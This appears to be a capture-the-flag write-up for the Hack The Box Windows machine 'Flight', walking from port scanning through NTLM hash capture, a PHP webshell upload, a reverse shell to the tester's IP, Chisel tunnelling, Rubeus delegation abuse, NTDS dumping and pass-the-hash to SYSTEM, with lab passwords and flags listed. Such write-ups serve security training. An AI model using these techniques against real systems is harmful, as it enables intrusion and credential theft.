
# CTF: Flight (HTB)

## Metadata

- **Target IP:** 10.129.228.120
    
- **OS:** Windows
    
- **Difficulty:** Medium
    
- **Date:** 2026-02-01
    
- **Tags:** #HTB #Windows #ActiveDirectory #NTLM-Theft #Responder #Rubeus #Kerberos-Delegation #SeImpersonate
    

---

## Reconnaissance

### Port Scanning

Initial full port scan followed by service and vulnerability scripts.

Bash

```
sudo nmap -p- -Pn $target -v --min-rate 1000 -oN nmap_ports.txt
nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt
```

**Open Ports:**

- **53/tcp:** DNS
    
- **80/tcp:** HTTP (Apache 2.4.52)
    
- **88/tcp:** Kerberos
    
- **135/139/445:** RPC/SMB
    
- **389/636:** LDAP/S
    
- **5985:** WinRM
    
- **8000:** Internal Web Server (discovered later via netstat)
    

### Virtual Host Discovery

Fuzzing for subdomains revealed `school.flight.htb`.

Bash

```
ffuf -u http://10.129.228.120 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7069
```

---

## Credential Cracking

Captured NTLMv2 hashes using **Responder** and cracked them via **John the Ripper**.

|**User**|**Password**|**Method**|
|---|---|---|
|`svc_apache`|`S@Ss!K@*t13`|Responder Capture|
|`c.bum`|`Tikkycoll_431012284`|NTLM_Theft (Desktop.ini)|

Bash

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Foothold

### User Enumeration & Credential Testing

Using `svc_apache` credentials to enumerate the domain.

Bash

```
# Check shares
netexec smb $target -u 'svc_apache' -p 'S@Ss!K@*t13' --shares

# Enumerate users and test credentials
netexec smb $target -u 'users' -p 'S@Ss!K@*t13'
```

### Web Exploitation

1. Discovered that `c.bum` has write access to the **Web** share.
    
2. Uploaded a PHP webshell (`rfi.php`):
    
    `<?php system($_GET["cmd"]); ?>`
    
3. Executed a PowerShell reverse shell encoded in the URL.
    

Bash

```
curl http://flight.htb/rfi.php?cmd=powershell%20-nop%20-c%20%22...%22
```

---

## Lateral Movement

### svc_apache $\rightarrow$ c.bum

Transitioned to the `c.bum` user using **RunasCs** to handle the limited logon session.

PowerShell

```
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.2:9001
```

### Chisel Tunneling

Found an internal service on port **8000**. Used Chisel to proxy it back to the Kali machine.

Bash

```
# Kali (Server)
./chisel server -p 8001 --reverse

# Target (Client)
./chisel.exe client 10.10.14.2:8001 R:8002:127.0.0.1:8000
```

---

## Privilege Escalation

### iis apppool $\rightarrow$ SYSTEM

After accessing the internal site via the tunnel and uploading an ASPX shell (Laudanum), the shell was running as `iis apppool\defaultapppool`.

1. **Check Privileges:** `SeImpersonatePrivilege` is enabled.
    
2. **Kerberos Delegation:** Used `Rubeus` to request a fake delegation TGT.
    

PowerShell

```
./rubeus.exe tgtdeleg /nowrap
```

3. **Ticket Conversion:** Converted the `.kirbi` ticket to `.ccache` for Impacket.
    

Bash

```
cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
python kirbi2ccache.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

4. **Dumping Secrets:** Used the ticket to dump the NTDS database via `secretsdump`.
    

Bash

```
impacket-secretsdump -k -no-pass g0.flight.htb
```

5. **Pass-the-Hash:** Gained a SYSTEM shell using the Administrator's NT hash.
    

Bash

```
impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

---

## Flags

- **User (C.Bum):** `7a40fefdecd760bbdc9c92bc2040d386`
    
- **Root (SYSTEM):** `13f48fa980ec516b6c1b1a413cfe3300`
